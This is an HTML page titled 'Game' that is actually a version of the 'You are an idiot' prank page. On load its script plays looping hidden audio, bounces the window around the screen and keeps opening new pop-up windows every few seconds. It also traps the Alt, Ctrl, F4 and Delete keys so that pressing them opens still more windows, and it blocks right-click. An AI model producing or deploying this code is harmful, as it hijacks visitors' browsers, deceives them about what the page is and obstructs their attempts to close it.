<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
<head>
    <title>Game</title>
</head>
<body bgcolor="#ffffff" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" style="margin:0; padding:0; overflow:hidden;" onclick="addBookmark()">

    <bgsound src="idiotl.wav" loop="infinite">
    <embed src="idiotl.wav" autostart="true" loop="true" hidden="true" width="0" height="0">

    <table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
        <tr>
            <td align="center" valign="middle">
                <img id="idiot_gif" src="flashl.gif" alt="You are an idiot!" width="100%" height="100%" style="width:100%; height:100%; display:block;">
            </td>
        </tr>
    </table>

    <script language="JavaScript">
        function addBookmark() {
            if (navigator.appName == "Microsoft Internet Explorer" && parseInt(navigator.appVersion) >= 4) {
                window.external.AddFavorite(location.href, "You are an idiot!");
            }
        }

        function blockRightClick() {
            return false;
        }
        document.oncontextmenu = blockRightClick;

        var flagRun = 1;
        var xOff = 5;
        var yOff = 5;
        var xPos = 400;
        var yPos = -100;

        function playBall() {
            if (flagRun != 1) return;
            
            xPos += xOff;
            yPos += yOff;
            
            if (xPos > screen.width - 357) xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
            if (xPos < 0) xOff = Math.ceil(7 * Math.random()) * 5 - 10;
            if (yPos > screen.height - 330) yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
            if (yPos < 0) yOff = Math.ceil(7 * Math.random()) * 5 - 10;
            
            window.moveTo(xPos, yPos);
            window.setTimeout("playBall()", 20);
        }

        function openWindow(url) {
            window.open(url, "_blank", "menubar=no,status=no,toolbar=no,resizable=no,width=357,height=330,titlebar=no,alwaysRaised=yes");
        }

        function procreate() {
            for (var i = 0; i < 5; i++) {
                openWindow("legacylol.html");
            }
        }

        function keyTrap() {
            if (event.keyCode == 18 || event.keyCode == 115 || event.keyCode == 17 || event.keyCode == 46) {
                alert("You are an idiot!");
                procreate();
            }
        }
        document.onkeydown = keyTrap;

        if ("title" in document) {
            try {
                document.title = "You are an idiot!";
            } catch(e) {}
        }
        playBall();
        procreate();
        
        if (window.setInterval) {
            window.setInterval("procreate()", 2500);
        }
    </script>
</body>
</html>
